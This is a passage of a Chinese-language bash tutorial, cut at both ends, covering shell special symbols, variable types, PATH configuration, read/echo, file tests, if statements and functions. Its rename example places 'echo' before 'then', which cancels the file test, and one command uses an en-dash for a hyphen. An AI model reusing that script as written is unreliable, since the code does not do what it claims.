class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#! /bin/bash</span></span><br><span class=\"line\"><span class=\"comment\"># 将指定目录下(参数传递$1)的所有以.txt为后缀的文件更名为*.doc</span></span><br><span class=\"line\">directory=<span class=\"variable\">$1</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> [ ! <span class=\"variable\">$directory</span> ]</span><br><span class=\"line\">  <span class=\"keyword\">then</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">\"please input the argument directory\"</span></span><br><span class=\"line\">  <span class=\"built_in\">exit</span></span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\">files=`ls <span class=\"variable\">$&#123;directory&#125;</span>`</span><br><span class=\"line\"><span class=\"keyword\">for</span> file <span class=\"keyword\">in</span> <span class=\"variable\">$files</span>;</span><br><span class=\"line\">  <span class=\"keyword\">do</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> [ -f <span class=\"variable\">$&#123;file&#125;</span> ]</span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"variable\">$file</span></span><br><span class=\"line\">    <span class=\"keyword\">then</span></span><br><span class=\"line\">    suffix=<span class=\"variable\">$&#123;file#*\\.&#125;</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"variable\">$suffix</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> [[ <span class=\"variable\">$suffix</span> == <span class=\"string\">\"txt\"</span> ]]</span><br><span class=\"line\">      <span class=\"keyword\">then</span></span><br><span class=\"line\">      prefix=<span class=\"variable\">$&#123;file%\\.*&#125;</span></span><br><span class=\"line\">      mv <span class=\"variable\">$directory</span>/<span class=\"variable\">$file</span> <span class=\"variable\">$directory</span>/<span class=\"variable\">$prefix</span>.doc</span><br><span class=\"line\">    <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"函数\"><a href=\"#函数\" class=\"headerlink\" title=\"函数\"></a>函数</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"title\">functionname</span></span>() &#123;</span><br><span class=\"line\">    命令列表</span><br><span class=\"line\">    <span class=\"built_in\">return</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">函数的调用方式为：</span><br><span class=\"line\">functionname arguments</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>Shell的概念是源自Unix的命令解释器。Shell不仅可解释用户输入的命令，同时，可解释执行基于命令的脚本语言。使用shell脚本能提高用户操作和管理员进行系统管理的效率。shell脚本擅长处理纯文本类型的数据，而Linux中几乎所有的配置文件、日志都是纯文本类型。</p>","more":"<h3 id=\"脚本书写规范\"><a href=\"#脚本书写规范\" class=\"headerlink\" title=\"脚本书写规范\"></a>脚本书写规范</h3><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>脚本统一存放目录</span><br><span class=\"line\"><span class=\"number\">2.</span>选择解释器, 开头要写#! XXX,内核根据#!后的解释器来确定用哪个解释器解释脚本内容</span><br><span class=\"line\"><span class=\"number\">3.</span>编辑脚本使用vim, 配置~/.vimrc方便个人书写习惯</span><br><span class=\"line\"><span class=\"number\">4.</span>文件名规范，结尾以sh结束</span><br></pre></td></tr></table></figure>\n<h3 id=\"shell的基本元素\"><a href=\"#shell的基本元素\" class=\"headerlink\" title=\"shell的基本元素\"></a>shell的基本元素</h3><figure class=\"highlight clean\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>#！/bin/bash 必须的，指出shell的类型</span><br><span class=\"line\"><span class=\"number\">2.</span># 注释。在shell中，注释写在#之后，#之后的内容不会执行</span><br><span class=\"line\"><span class=\"number\">3.</span>变量</span><br><span class=\"line\"><span class=\"number\">4.</span>控制 循环分支</span><br></pre></td></tr></table></figure>\n<h3 id=\"shell中的特殊符号\"><a href=\"#shell中的特殊符号\" class=\"headerlink\" title=\"shell中的特殊符号\"></a>shell中的特殊符号</h3><figure class=\"highlight elixir\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>.<span class=\"comment\">#! 注明执行脚本采用的shell</span></span><br><span class=\"line\"><span class=\"number\">2</span>.<span class=\"variable\">$ </span>变量符。</span><br><span class=\"line\">与反斜杠转义符相反，使其后的普通字符作为变量名，如<span class=\"variable\">$a</span>表示变量a的值。变量</span><br><span class=\"line\">字符长度超过<span class=\"number\">1</span>个时，用&#123;&#125;括起来</span><br><span class=\"line\"><span class=\"number\">3</span>.单引号。</span><br><span class=\"line\">被引起的字符全部做普通字符，即全部原样echo <span class=\"string\">'my $SHELL'</span></span><br><span class=\"line\"><span class=\"number\">4</span>.双引号</span><br><span class=\"line\">引号内的内容，除<span class=\"variable\">$、</span>转义符\\、倒引号`这三个保留特殊功能，其他字符均做普通字符。</span><br><span class=\"line\"><span class=\"number\">5</span>.倒引号(数字<span class=\"number\">1</span>键旁边的那个键）</span><br><span class=\"line\">引号内的字符串当做shell命令行解释执行（同样的功能也可以使用<span class=\"variable\">$(</span>)来使用），得到的结果</span><br><span class=\"line\">取代整个倒引号括起来的部分。</span><br><span class=\"line\"><span class=\"number\">6</span>.反斜线</span><br><span class=\"line\">反斜线是转义字符，它能把特殊字符变成普通字符。在某个字符前面利用反斜杠（\\）能够阻止</span><br><span class=\"line\">shell把后面的字符解释为特殊字符。</span><br><span class=\"line\"><span class=\"number\">7</span>.*  代表<span class=\"number\">0</span>个或者多个特殊字符</span><br><span class=\"line\">例子 yum.* 代表的可以使yum.也可以是yum.a、yum.ab、yum.abc 当然小数点后面可以有多个字母</span><br><span class=\"line\"><span class=\"number\">8</span>.? 代表的是任意一个字符</span><br><span class=\"line\">例子 yum.? 可以是yum.a yum.b yum.c，但是要注意小数点后面必须有任意一个字符</span><br><span class=\"line\"><span class=\"number\">9</span>.[]</span><br><span class=\"line\">代表的是中括号中的任意一个</span><br><span class=\"line\">[abcdef] 可以是a b c d e f 中的任意一个字母当然也可以是数字</span><br><span class=\"line\">[-]代表的是一个范围</span><br><span class=\"line\">[a-z] 表示的是字母a到z之间的所有字母</span><br><span class=\"line\">[^]^是反向选择符号从字面意思可以知道也就是非的意思</span><br><span class=\"line\">[^abc]表示只要不a b c 这三个字符中的任意一个就选择</span><br><span class=\"line\"><span class=\"number\">10</span>.<span class=\"variable\">$(</span> )</span><br><span class=\"line\">可以将命令替换输出赋值给变量</span><br><span class=\"line\"><span class=\"number\">11</span>.&#123;&#125;</span><br><span class=\"line\">通过括号扩展可以生成需要的字串，括号中可以包含连续的序列或使用逗号分隔的多个项目，连续的序列包括一个起点和一个终点</span><br><span class=\"line\">user<span class=\"variable\">@computer</span>: ~<span class=\"variable\">$ </span>echo &#123;a,b,c&#125;</span><br><span class=\"line\"> a b c</span><br><span class=\"line\">user<span class=\"variable\">@computer</span>: ~<span class=\"variable\">$ </span>echo user&#123;<span class=\"number\">1</span>,<span class=\"number\">5</span>,<span class=\"number\">8</span>&#125;</span><br><span class=\"line\">user1 user5 user8</span><br><span class=\"line\">user<span class=\"variable\">@computer</span>: ~<span class=\"variable\">$ </span>echo &#123;<span class=\"number\">0</span>..<span class=\"number\">10</span>&#125;</span><br><span class=\"line\"><span class=\"number\">0</span> <span class=\"number\">1</span> <span class=\"number\">2</span> <span class=\"number\">3</span> <span class=\"number\">4</span> <span class=\"number\">5</span> <span class=\"number\">6</span> <span class=\"number\">7</span> <span class=\"number\">8</span> <span class=\"number\">9</span> <span class=\"number\">10</span></span><br><span class=\"line\">user<span class=\"variable\">@computer</span>: ~<span class=\"variable\">$ </span>mkdir &#123;dir1,dir2,dir3&#125;</span><br><span class=\"line\">user<span class=\"variable\">@computer</span>: ~<span class=\"variable\">$ </span>ls –ld dir&#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"变量\"><a href=\"#变量\" class=\"headerlink\" title=\"变量\"></a>变量</h3><p>shell变量可以保存路径名、文件名或者一个数字等。分为三类：</p>\n<figure class=\"highlight dockerfile\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">本地变量: (局部变量)只在创建它们的<span class=\"keyword\">Shell</span><span class=\"bash\">中使用，可以在shell程序内任意使用和修改它</span></span><br><span class=\"line\">们。</span><br><span class=\"line\">环境变量: 可以在创建它们的<span class=\"keyword\">Shell</span><span class=\"bash\">及其派生出来的任意子程序中使用。有些变量是用户创建</span></span><br><span class=\"line\">的，其他的则是专用的（比如PATH、HOME)。是系统环境的一部分，不必去定义它们，可以在</span><br><span class=\"line\"><span class=\"keyword\">shell</span><span class=\"bash\">程序中使用它们 。还能在shell中加以修改。</span></span><br><span class=\"line\">内部变量: 由系统提供的。与环境变量不同，用户不能修改它们。</span><br></pre></td></tr></table></figure>\n<h4 id=\"本地变量\"><a href=\"#本地变量\" class=\"headerlink\" title=\"本地变量\"></a>本地变量</h4><figure class=\"highlight elixir\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">本地变量 在用户现在的shell生命期的脚本中使用</span><br><span class=\"line\"> 变量名=值</span><br><span class=\"line\"><span class=\"number\">1</span>.等号两边不可以有空格</span><br><span class=\"line\"><span class=\"number\">2</span>.取值包含空格，必须用双引号括起来</span><br><span class=\"line\"><span class=\"number\">3</span>.Shell变量可以用大小写字母，区分大小写</span><br><span class=\"line\"></span><br><span class=\"line\">变量是弱类型的, 不用声明类型</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 变量声明及赋值格式</span></span><br><span class=\"line\">变量=值（等号两边不能有空格）</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 变量的引用</span></span><br><span class=\"line\"> <span class=\"variable\">$变</span>量名</span><br><span class=\"line\"> <span class=\"variable\">$&#123;</span>变量名&#125;</span><br><span class=\"line\"> 变量名为<span class=\"number\">1</span>个字符时建议使用方式一，多余一个字符时建议使用方式二</span><br><span class=\"line\"> 举例: <span class=\"variable\">$a</span> <span class=\"variable\">$&#123;</span>abc&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 清除变量</span></span><br><span class=\"line\">unset 变量名</span><br><span class=\"line\">user<span class=\"variable\">@computer</span>: ~<span class=\"variable\">$ </span>name=Jack</span><br><span class=\"line\">user<span class=\"variable\">@computer</span>: ~<span class=\"variable\">$ </span>echo <span class=\"variable\">$&#123;</span>name&#125;</span><br><span class=\"line\">user<span class=\"variable\">@computer</span>: ~<span class=\"variable\">$ </span>unset name  <span class=\"comment\"># 注意,name前没有$</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 设置只读变量</span></span><br><span class=\"line\">设置变量时，不想再改变其值，可以将之设为只读变量</span><br><span class=\"line\"> 变量名=值</span><br><span class=\"line\"> readonly  变量名</span><br></pre></td></tr></table></figure>\n<h4 id=\"环境变量\"><a href=\"#环境变量\" class=\"headerlink\" title=\"环境变量\"></a>环境变量</h4><p>Bash预设了很多环境变量，实际使用中，可以直接调用这些变量。环境变量可以用于所有子程序，着包括编辑器、脚本和应用</p>\n<p>内置环境变量</p>\n<figure class=\"highlight dts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"symbol\">HOME:</span> 代表使用者的家目录。cd ~ 去到使用者的家目录 或者利用 cd 就可以直接回到使用者</span><br><span class=\"line\">家目录了。</span><br><span class=\"line\"><span class=\"symbol\">SHELL:</span> 目前这个环境使用的 SHELL 是哪个程序？ 如果是 bash 的话，预设是 <span class=\"meta-keyword\">/bin/</span>bash</span><br><span class=\"line\">PWD：用户当前工作目录的路径。它指出用户目前在Linux文件系统中处在什么位置。它是由</span><br><span class=\"line\">Linux自动设置的</span><br><span class=\"line\"><span class=\"symbol\">HISTSIZE:</span> 这个与“历史命令”有关，曾经下达过的指令可以被系统记录下来，而记录的“数目”</span><br><span class=\"line\">则是由这个值来设定的。</span><br><span class=\"line\"><span class=\"symbol\">PATH:</span> 就是执行文件搜寻的路径，目录与目录中间以冒号(:)分隔， 由于文件的搜寻是依序由</span><br><span class=\"line\">PATH的变量内的目录来查询，所以，目录的顺序也很重要。</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">环境变量可以在命令行中设置，但用户注销时这些值将丢失</span><br><span class=\"line\">   环境变量均为大写</span><br><span class=\"line\">   必须用<span class=\"built_in\">export</span>命令导出</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 设置环境变量</span></span><br><span class=\"line\">variable-name=value</span><br><span class=\"line\"><span class=\"built_in\">export</span> variable-name(环境变量名大写)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 显示环境变量</span></span><br><span class=\"line\">env 可以看到所有的环境变量</span><br><span class=\"line\"><span class=\"built_in\">echo</span> $环境变量名 （显示一个变量）</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 清除环境变量</span></span><br><span class=\"line\"><span class=\"built_in\">unset</span> 环境变量名</span><br></pre></td></tr></table></figure>\n<p>修改path环境变量</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">修改PATH环境变量，使脚本不用加路径，直接输入文件名字即可执行。</span><br><span class=\"line\"><span class=\"comment\"># 命令行修改环境变量</span></span><br><span class=\"line\">以下在用户user主目录下操作：</span><br><span class=\"line\">mkdir shdir &amp;&amp; <span class=\"built_in\">cd</span> shdir</span><br><span class=\"line\">vi hello</span><br><span class=\"line\">chmod 755 hello</span><br><span class=\"line\"><span class=\"built_in\">cd</span> ～</span><br><span class=\"line\"><span class=\"built_in\">export</span> PATH=<span class=\"variable\">$PATH</span>:<span class=\"variable\">$HOME</span>/shdir</span><br><span class=\"line\">在任何目录下，输入hello即可执行该文件。</span><br><span class=\"line\">本方式下环境变量如果修改错了，<span class=\"built_in\">exit</span>退出后重新登陆即可恢复系统默认的值。</span><br></pre></td></tr></table></figure>\n<p>配置文件中修改环境变量</p>\n<figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">注意，修改环境变量前最好先备份一下旧的：</span><br><span class=\"line\"><span class=\"builtin-name\">export</span> <span class=\"attribute\">tem</span>=<span class=\"variable\">$PATH</span></span><br><span class=\"line\">echo <span class=\"variable\">$tem</span> &gt;&gt;pathbake</span><br><span class=\"line\"></span><br><span class=\"line\">需要知道环境变量与哪些配置文件有关：不同发行版会有不同，但命名还是有通性的：</span><br><span class=\"line\"><span class=\"builtin-name\">find</span> / -name “*profile”</span><br><span class=\"line\"><span class=\"builtin-name\">find</span> / -name “<span class=\"number\">*ba</span>shrc”</span><br><span class=\"line\">全局配置文件/etc/profile</span><br><span class=\"line\">本地配置文件~/.bashrc</span><br></pre></td></tr></table></figure>\n<h4 id=\"内部变量\"><a href=\"#内部变量\" class=\"headerlink\" title=\"内部变量\"></a>内部变量</h4><p>内部变量是Linux所提供的一种特殊类型的变量，这类变量在程序中用来作出判断。在shell程序内这类变量的值是不能修改的。</p>\n<figure class=\"highlight gams\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">部分内部变量是：</span><br><span class=\"line\"><span class=\"symbol\">$</span># 传送给shell程序的位置参数的数量</span><br><span class=\"line\"><span class=\"symbol\">$</span>? 最后命令的完成码或者在shell程序内部执行的shell程序（返回值）</span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta-keyword\">$0</span> shell程序的名称</span></span><br><span class=\"line\"><span class=\"symbol\">$</span>* 调用shell程序时所传送的全部参数的单字符串，<span class=\"string\">\"参数1\"</span>, <span class=\"string\">\"参数2\"</span>…形式保存的参数</span><br><span class=\"line\"><span class=\"symbol\">$</span>@ <span class=\"string\">\"参数1\"</span>, <span class=\"string\">\"参数2\"</span>…形式保存的参数</span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta-keyword\">$n</span> 第n个参数</span></span><br><span class=\"line\"><span class=\"symbol\">$</span><span class=\"symbol\">$</span> 本程序的PID</span><br><span class=\"line\"><span class=\"symbol\">$</span>! 上一个命令的PID</span><br></pre></td></tr></table></figure>\n<h3 id=\"输入与输出\"><a href=\"#输入与输出\" class=\"headerlink\" title=\"输入与输出\"></a>输入与输出</h3><figure class=\"highlight haml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># read 从键盘上读取变量的值</span><br><span class=\"line\">read  [选项]  变量名列表</span><br><span class=\"line\">    常用选项</span><br><span class=\"line\">    -<span class=\"ruby\">a ANAME   将输入读入ANAME的数组</span></span><br><span class=\"line\"><span class=\"ruby\">    -n NCHARS  读入N个字符</span></span><br><span class=\"line\"><span class=\"ruby\">    -p PROMPT  显示一个提示</span></span><br><span class=\"line\"><span class=\"ruby\">    -r         取消转移</span></span><br><span class=\"line\"><span class=\"ruby\">    -s         安静模式，输入的字符将不会提示</span></span><br><span class=\"line\"><span class=\"ruby\">    -t TIMEOUT 超过指定时间，read自动停止</span></span><br><span class=\"line\"><span class=\"ruby\"></span></span><br><span class=\"line\"><span class=\"ruby\"><span class=\"comment\"># echo 显示字符串或变量的值</span></span></span><br><span class=\"line\"><span class=\"ruby\">echo  [选项]  字符串</span></span><br><span class=\"line\"><span class=\"ruby\">    常用选项</span></span><br><span class=\"line\"><span class=\"ruby\">    -n  不在最后自动换行</span></span><br><span class=\"line\"><span class=\"ruby\">    -e  启用反斜线控制字符的转换</span></span><br><span class=\"line\"><span class=\"ruby\">    -E  不处理转义字符。此为缺省选项；</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#! /bin/bash</span></span><br><span class=\"line\"><span class=\"comment\"># 输入一句话，打印输入的话</span></span><br><span class=\"line\"><span class=\"built_in\">read</span> -p <span class=\"string\">'please type some words, I will print them: '</span> words</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$words</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"条件测试\"><a href=\"#条件测试\" class=\"headerlink\" title=\"条件测试\"></a>条件测试</h3><figure class=\"highlight subunit\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># test</span><br><span class=\"line\"><span class=\"keyword\">test </span>条件表达式</span><br><span class=\"line\">如果测试条件为真，test命令会返回0，否则返回一个非0的数值</span><br><span class=\"line\"><span class=\"keyword\">test </span>语句与if/then和case语句一起，构成shell编程的控制转移结构</span><br><span class=\"line\"></span><br><span class=\"line\"># []</span><br><span class=\"line\">[ 条件表达式 ]</span><br><span class=\"line\">方括号的内侧两边各需一个空格</span><br><span class=\"line\"></span><br><span class=\"line\">条件表达式的值为真返回零，为假时返回非零值</span><br></pre></td></tr></table></figure>\n<h4 id=\"文件状态判断\"><a href=\"#文件状态判断\" class=\"headerlink\" title=\"文件状态判断\"></a>文件状态判断</h4><figure class=\"highlight tcl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-d <span class=\"keyword\">filename</span>\t若文件<span class=\"keyword\">filename</span>为目录文件，则返回真</span><br><span class=\"line\"></span><br><span class=\"line\">-f <span class=\"keyword\">filename</span>\t文件是否存在且为普通文件，则返回真</span><br><span class=\"line\"></span><br><span class=\"line\">-r <span class=\"keyword\">filename</span>\t若文件<span class=\"keyword\">filename</span>可读，则返回真</span><br><span class=\"line\"></span><br><span class=\"line\">-s <span class=\"keyword\">filename</span>\t若文件<span class=\"keyword\">filename</span>的长度大于<span class=\"number\">0</span>，则返回真</span><br><span class=\"line\"></span><br><span class=\"line\">-w <span class=\"keyword\">filename</span>\t若文件<span class=\"keyword\">filename</span>可写，则返回真</span><br><span class=\"line\"></span><br><span class=\"line\">-x <span class=\"keyword\">filename</span>\t若文件<span class=\"keyword\">filename</span>可执行，则返回真</span><br><span class=\"line\"></span><br><span class=\"line\">-e <span class=\"keyword\">filename</span>\t文件是否存在</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#! /bin/bash</span></span><br><span class=\"line\"><span class=\"comment\"># 输入文件的绝对路径，判断文件是否存在</span></span><br><span class=\"line\"><span class=\"built_in\">read</span>  -p <span class=\"string\">'input file path: '</span> file</span><br><span class=\"line\"><span class=\"keyword\">if</span> [ -e <span class=\"variable\">$file</span> ]</span><br><span class=\"line\">    <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">'文件存在'</span></span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">'文件不存在'</span></span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"条件语句\"><a href=\"#条件语句\" class=\"headerlink\" title=\"条件语句\"></a>条件语句</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>  [ 条件表达式 ]</span><br><span class=\"line\">    <span class=\"keyword\">then</span></span><br><span class=\"line\">    命令序列1</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    命令序列2</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\">当<span class=\"string\">\"条件表达式\"</span>的测试值为真时，执行<span class=\"string\">\"命令序列1\"</span>，否则，执行<span class=\"string\">\"命令序列2\"</span>。命令序列中的命令</span><br><span class=\"line\">可以是一个或者多个。</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> [ 条件表达式 ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    命令序列</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\">当<span class=\"string\">\"条件表达式\"</span>的测试值为真时，执行<span class=\"string\">\"命令序列\"</span>,否则，执行条件语句后面的命令。条件表达</span><br><span class=\"line\">式与<span class=\"keyword\">then</span>之间的分号<span class=\"string\">\";\"</span>起命令分隔符的作用。</span><br><span class=\"line\"></span><br><span class=\"line\">语法形式三</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">test</span> 条件表达式1</span><br><span class=\"line\">    <span class=\"keyword\">then</span></span><br><span class=\"line\">    命令序列1</span><br><span class=\"line\"><span class=\"keyword\">elif</span> [ 条件表达式2 ]</span><br><span class=\"line\">    <span class=\"keyword\">then</span></span><br><span class=\"line\">    命令序列2</span><br><span 